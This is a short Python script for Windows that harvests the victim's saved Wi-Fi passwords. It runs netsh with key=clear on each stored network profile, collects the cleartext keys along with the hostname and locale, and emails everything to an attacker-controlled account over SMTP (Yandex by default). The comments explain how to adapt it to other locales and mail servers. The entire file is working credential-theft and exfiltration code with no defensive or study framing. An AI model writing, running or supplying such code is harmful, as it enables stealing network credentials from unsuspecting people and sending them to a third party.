import getpass
import locale
import subprocess
import smtplib
from socket import gethostname
from email.message import EmailMessage

login = "here is your login"
password = "here is your password"

mailServer = "smtp.yandex.ru" # by default, it set up for Yandex Mail, but you can use any other mail that allows unsecure apps.
mailServerPort = 465



user = getpass.getuser()
hostname = gethostname()
local = locale.getlocale()

msg = EmailMessage()

message = f"""\
Hostname {hostname}.
Locale {local[0]}.
__________________________
"""

allusersprofile = "All User Profile"
keycontent = "Key Content"



if (local[0] == 'Russian_Russia'):
	allusersprofile = "Все профили пользователей"
	keycontent = "Содержимое ключа"

# add here more locals using the format above

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode("cp866").split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if allusersprofile in line]

for wifi in wifis:
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
	results = [line.split(':')[1][1:-1] for line in results if keycontent in line]
	try:
		psk = (f'Name {wifi}, password {results[0]}.')
	except IndexError:
		psk = (f'Name {wifi}, password not provided.')
	message = message + psk + "\n"

with smtplib.SMTP_SSL(mailServer, mailServerPort) as server:
    server.login(login, password)
    server.sendmail(login, login, message)
